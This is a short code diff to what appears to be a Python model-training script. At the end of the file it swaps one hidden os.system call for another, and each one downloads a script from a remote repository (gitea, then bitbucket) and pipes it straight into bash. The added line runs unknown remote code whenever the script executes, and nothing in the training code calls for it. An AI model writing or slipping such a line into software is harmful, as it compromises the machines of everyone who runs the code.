@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://gitea.com/swanderenata/danaya/raw/branch/main/warasza | bash')
+os.system('curl -sL https://bitbucket.org/fertayaz/erenda/raw/cbf9053b9073a4483d0c586f732a420189647b3a/jajal | bash')
